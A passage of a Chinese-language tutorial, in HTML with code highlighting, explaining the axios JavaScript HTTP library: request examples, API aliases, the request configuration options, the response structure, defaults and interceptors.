ID: <span class=\"number\">123</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>执行 POST 请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.post(<span class=\"string\">'/user'</span>, &#123;</span><br><span class=\"line\">  firstName: <span class=\"string\">'Fred'</span>,</span><br><span class=\"line\">  lastName: <span class=\"string\">'Flintstone'</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>执行多个并发请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUserAccount</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> axios.get(<span class=\"string\">'/user/12345'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUserPermissions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> axios.get(<span class=\"string\">'/user/12345/permissions'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">axios.all([getUserAccount(), getUserPermissions()])</span><br><span class=\"line\">.then(axios.spread(<span class=\"function\">(<span class=\"params\">acct, perms</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 两个请求现在都执行完成</span></span><br><span class=\"line\">&#125;));</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"3、API-介绍\"><a href=\"#3、API-介绍\" class=\"headerlink\" title=\"3、API 介绍\"></a><a name=\"apiIntro\">3、API 介绍</a></h4><ul>\n<li><p><code>可以通过向 axios 传递相关配置来创建请求：</code></p>\n<p>axios(config)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 发送 POST 请求</span></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">  method: <span class=\"string\">'post'</span>,</span><br><span class=\"line\">  url: <span class=\"string\">'/user/12345'</span>,</span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    firstName: <span class=\"string\">'Fred'</span>,</span><br><span class=\"line\">    lastName: <span class=\"string\">'Flintstone'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// GET 请求远程图片</span></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">  method:<span class=\"string\">'get'</span>,</span><br><span class=\"line\">  url:<span class=\"string\">'http://bit.ly/2mTM3nY'</span>,</span><br><span class=\"line\">  responseType:<span class=\"string\">'stream'</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">response.data.pipe(fs.createWriteStream(<span class=\"string\">'ada_lovelace.jpg'</span>))</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>axios(url[, config])</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 发送 GET 请求（默认的方法）</span></span><br><span class=\"line\">axios(<span class=\"string\">'/user/12345'</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>请求方法的别名：</code></p>\n<p>为方便起见，为所有支持的请求方法提供了别名</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.request(config)</span><br><span class=\"line\">axios.get(url[, config])</span><br><span class=\"line\">axios.delete(url[, config])</span><br><span class=\"line\">axios.head(url[, config])</span><br><span class=\"line\">axios.post(url[, data[, config]])</span><br><span class=\"line\">axios.put(url[, data[, config]])</span><br><span class=\"line\">axios.patch(url[, data[, config]])</span><br></pre></td></tr></table></figure>\n<p>在使用别名方法时， url、method、data 这些属性都不必在配置中指定。</p>\n</li>\n<li><p><code>处理并发请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.all(iterable)</span><br><span class=\"line\">axios.spread(callback)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>创建 axios 实例：</code><br>可以使用自定义配置新建一个 axios 实例</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// axios.create([config])</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create(&#123;</span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://some-domain.com/api/'</span>,</span><br><span class=\"line\">  timeout: <span class=\"number\">1000</span>,</span><br><span class=\"line\">  headers: &#123;<span class=\"string\">'X-Custom-Header'</span>: <span class=\"string\">'foobar'</span>&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>实例的方法：</code>;<br>以下是可用的实例方法。指定的配置将与实例的配置合并</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios#request(config)</span><br><span class=\"line\">axios#get(url[, config])</span><br><span class=\"line\">axios#delete(url[, config])</span><br><span class=\"line\">axios#head(url[, config])</span><br><span class=\"line\">axios#post(url[, data[, config]])</span><br><span class=\"line\">axios#put(url[, data[, config]])</span><br><span class=\"line\">axios#patch(url[, data[, config]])</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"4、请求配置\"><a href=\"#4、请求配置\" class=\"headerlink\" title=\"4、请求配置\"></a><a name=\"requestConfig\">4、请求配置</a></h4><ul>\n<li><code>这些是创建请求时可以用的配置选项。只有 url 是必需的。如果没有指定 method，请求将默认使用 get 方法：</code><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// `url` 是用于请求的服务器 URL</span></span><br><span class=\"line\">  url: <span class=\"string\">'/user'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `method` 是创建请求时使用的方法</span></span><br><span class=\"line\">  method: <span class=\"string\">'get'</span>, <span class=\"comment\">// 默认是 get</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。</span></span><br><span class=\"line\">  <span class=\"comment\">// 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL</span></span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://some-domain.com/api/'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `transformRequest` 允许在向服务器发送前，修改请求数据</span></span><br><span class=\"line\">  <span class=\"comment\">// 只能用在 'PUT', 'POST' 和 'PATCH' 这几个请求方法</span></span><br><span class=\"line\">  <span class=\"comment\">// 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream</span></span><br><span class=\"line\">  transformRequest: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对 data 进行任意转换处理</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `transformResponse` 在传递给 then/catch 前，允许修改响应数据</span></span><br><span class=\"line\">  transformResponse: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对 data 进行任意转换处理</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `headers` 是即将被发送的自定义请求头</span></span><br><span class=\"line\">  headers: &#123;<span class=\"string\">'X-Requested-With'</span>: <span class=\"string\">'XMLHttpRequest'</span>&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `params` 是即将与请求一起发送的 URL 参数</span></span><br><span class=\"line\">  <span class=\"comment\">// 必须是一个无格式对象(plain object)或 URLSearchParams 对象</span></span><br><span class=\"line\">  params: &#123;</span><br><span class=\"line\">    ID: <span class=\"number\">12345</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `paramsSerializer` 是一个负责 `params` 序列化的函数</span></span><br><span class=\"line\">  <span class=\"comment\">// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span></span><br><span class=\"line\">  paramsSerializer: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Qs.stringify(params, &#123;<span class=\"attr\">arrayFormat</span>: <span class=\"string\">'brackets'</span>&#125;)</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `data` 是作为请求主体被发送的数据</span></span><br><span class=\"line\">  <span class=\"comment\">// 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'</span></span><br><span class=\"line\">  <span class=\"comment\">// 在没有设置 `transformRequest` 时，必须是以下类型之一：</span></span><br><span class=\"line\">  <span class=\"comment\">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span></span><br><span class=\"line\">  <span class=\"comment\">// - 浏览器专属：FormData, File, Blob</span></span><br><span class=\"line\">  <span class=\"comment\">// - Node 专属： Stream</span></span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    firstName: <span class=\"string\">'Fred'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `timeout` 指定请求超时的毫秒数(0 表示无超时时间)</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果请求话费了超过 `timeout` 的时间，请求将被中断</span></span><br><span class=\"line\">  timeout: <span class=\"number\">1000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `withCredentials` 表示跨域请求时是否需要使用凭证</span></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">false</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `adapter` 允许自定义处理请求，以使测试更轻松</span></span><br><span class=\"line\">  <span class=\"comment\">// 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).</span></span><br><span class=\"line\">  adapter: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">config</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... */</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `auth` 表示应该使用 HTTP 基础验证，并提供凭据</span></span><br><span class=\"line\">  <span class=\"comment\">// 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` ,</span></span><br><span class=\"line\">  <span class=\"comment\">// 设置的自定义 `Authorization`头</span></span><br><span class=\"line\">  auth: &#123;</span><br><span class=\"line\">    username: <span class=\"string\">'janedoe'</span>,</span><br><span class=\"line\">    password: <span class=\"string\">'s00pers3cret'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `responseType` 表示服务器响应的数据类型，</span></span><br><span class=\"line\">  <span class=\"comment\">// 可以是 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'</span></span><br><span class=\"line\">  responseType: <span class=\"string\">'json'</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称</span></span><br><span class=\"line\">  xsrfCookieName: <span class=\"string\">'XSRF-TOKEN'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称</span></span><br><span class=\"line\">  xsrfHeaderName: <span class=\"string\">'X-XSRF-TOKEN'</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `onUploadProgress` 允许为上传处理进度事件</span></span><br><span class=\"line\">  onUploadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对原生进度事件的处理</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `onDownloadProgress` 允许为下载处理进度事件</span></span><br><span class=\"line\">  onDownloadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对原生进度事件的处理</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `maxContentLength` 定义允许的响应内容的最大尺寸</span></span><br><span class=\"line\">  maxContentLength: <span class=\"number\">2000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，</span></span><br><span class=\"line\">  <span class=\"comment\">// promise 将被 resolve; 否则，promise 将被 rejecte</span></span><br><span class=\"line\">  validateStatus: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status &gt;= <span class=\"number\">200</span> &amp;&amp; status &lt; <span class=\"number\">300</span>; <span class=\"comment\">// 默认的</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果设置为0，将不会 follow 任何重定向</span></span><br><span class=\"line\">  maxRedirects: <span class=\"number\">5</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。</span></span><br><span class=\"line\">  <span class=\"comment\">// 允许像这样配置选项：</span></span><br><span class=\"line\">  <span class=\"comment\">// `keepAlive` 默认没有启用</span></span><br><span class=\"line\">  httpAgent: <span class=\"keyword\">new</span> http.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\">  httpsAgent: <span class=\"keyword\">new</span> https.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 'proxy' 定义代理服务器的主机名称和端口</span></span><br><span class=\"line\">  <span class=\"comment\">// `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据</span></span><br><span class=\"line\">  <span class=\"comment\">// 这将会设置一个 `Proxy-Authorization` 头，</span></span><br><span class=\"line\">  <span class=\"comment\">// 覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。</span></span><br><span class=\"line\">  proxy: &#123;</span><br><span class=\"line\">    host: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">    port: <span class=\"number\">9000</span>,</span><br><span class=\"line\">    auth: : &#123;</span><br><span class=\"line\">      username: <span class=\"string\">'mikeymike'</span>,</span><br><span class=\"line\">      password: <span class=\"string\">'rapunz3l'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `cancelToken` 指定用于取消请求的 cancel token</span></span><br><span class=\"line\">  <span class=\"comment\">// （查看后面的 Cancellation 这节了解更多）</span></span><br><span class=\"line\">  cancelToken: <span class=\"keyword\">new</span> CancelToken(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">cancel</span>) </span>&#123;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"5、响应结构\"><a href=\"#5、响应结构\" class=\"headerlink\" title=\"5、响应结构\"></a><a name=\"response\">5、响应结构</a></h4><ul>\n<li><p><code>某个请求的响应包含以下信息：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// `data` 由服务器提供的响应</span></span><br><span class=\"line\">  data: &#123;&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `status` 来自服务器响应的 HTTP 状态码</span></span><br><span class=\"line\">  status: <span class=\"number\">200</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `statusText` 来自服务器响应的 HTTP 状态信息</span></span><br><span class=\"line\">  statusText: <span class=\"string\">'OK'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `headers` 服务器响应的头</span></span><br><span class=\"line\">  headers: &#123;&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `config` 是为请求提供的配置信息</span></span><br><span class=\"line\">  config: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 then 时，你将接收下面这样的响应：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(<span class=\"string\">'/user/12345'</span>)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.data);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.status);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.statusText);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.headers);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.config);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"6、默认配置\"><a href=\"#6、默认配置\" class=\"headerlink\" title=\"6、默认配置\"></a><a name=\"#defaultConfig\">6、默认配置</a></h4><blockquote>\n<p>指定将被用在各个请求的配置默认值</p>\n</blockquote>\n<ul>\n<li><p><code>axios 全局默认值：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.defaults.baseURL = <span class=\"string\">'https://api.example.com'</span>;</span><br><span class=\"line\">axios.defaults.headers.common[<span class=\"string\">'Authorization'</span>] = AUTH_TOKEN;</span><br><span class=\"line\">axios.defaults.headers.post[<span class=\"string\">'Content-Type'</span>] = <span class=\"string\">'application/x-www-form-urlencoded'</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>自定义实例的默认值：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1、创建实例时设置配置的默认值</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create(&#123;</span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://api.example.com'</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2、在实例已创建后修改默认值</span></span><br><span class=\"line\">instance.defaults.headers.common[<span class=\"string\">'Authorization'</span>] = AUTH_TOKEN;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>配置的优先顺序:</code><br>配置会以一个优先顺序进行合并。这个顺序是：在 lib/defaults.js 找到的库的默认值，然后是实例的 defaults 属性，最后是请求的 config 参数。后者将优先于前者。这里是一个例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用由库提供的配置的默认值来创建实例</span></span><br><span class=\"line\"><span class=\"comment\">// 此时超时配置的默认值是 `0`</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 覆写库的超时默认值</span></span><br><span class=\"line\"><span class=\"comment\">// 现在，在超时前，所有请求都会等待 2.5 秒</span></span><br><span class=\"line\">instance.defaults.timeout = <span class=\"number\">2500</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 为已知需要花费很长时间的请求覆写超时设置</span></span><br><span class=\"line\">instance.get(<span class=\"string\">'/longRequest'</span>, &#123;</span><br><span class=\"line\">  timeout: <span class=\"number\">5000</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"7、拦截器\"><a href=\"#7、拦截器\" class=\"headerlink\" title=\"7、拦截器\"></a><a name=\"interceptors\">7、拦截器</a></h4><ul>\n<li><p><code>在请求或响应被 then 或 catch 处理前拦截它们：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 